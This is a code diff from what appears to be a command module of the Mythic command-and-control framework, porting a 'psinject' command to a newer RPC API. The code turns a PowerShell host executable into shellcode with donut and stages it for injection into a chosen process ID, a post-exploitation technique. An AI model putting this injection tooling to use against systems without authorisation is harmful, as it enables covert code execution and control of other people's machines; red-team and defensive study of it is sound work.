@@ -75,22 +75,27 @@ class PsInjectCommand(CommandBase):
         shutil.copy(outputPath, POWERSHELL_HOST_PATH)
 
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
+    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
+        response = PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
         global POWERSHELL_HOST_PATH 
         if not path.exists(POWERSHELL_HOST_PATH):
             await self.build_powershell()
 
-        donutPic = donut.create(file=POWERSHELL_HOST_PATH, params=task.args.get_arg("pipe_name"))
-        file_resp = await MythicRPC().execute("create_file",
-                                              task_id=task.id,
-                                              file=base64.b64encode(donutPic).decode(),
-                                              delete_after_fetch=True)
-        if file_resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+        donutPic = donut.create(file=POWERSHELL_HOST_PATH, params=taskData.args.get_arg("pipe_name"))
+        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+            TaskID=taskData.Task.ID,
+            FileContents=donutPic,
+            DeleteAfterFetch=True
+        ))
+        if file_resp.Success:
+            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
         else:
-            raise Exception("Failed to register PowerShellHost.exe: " + file_resp.error)
-        task.display_params = "-PID {} -Command {}".format(task.args.get_arg("pid"), task.args.get_arg("powershell_params"))
-        return task
+            raise Exception("Failed to register PowerShellHost.exe: " + file_resp.Error)
+        response.DisplayParams = "-PID {} -Command {}".format(taskData.args.get_arg("pid"), taskData.args.get_arg("powershell_params"))
+        return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
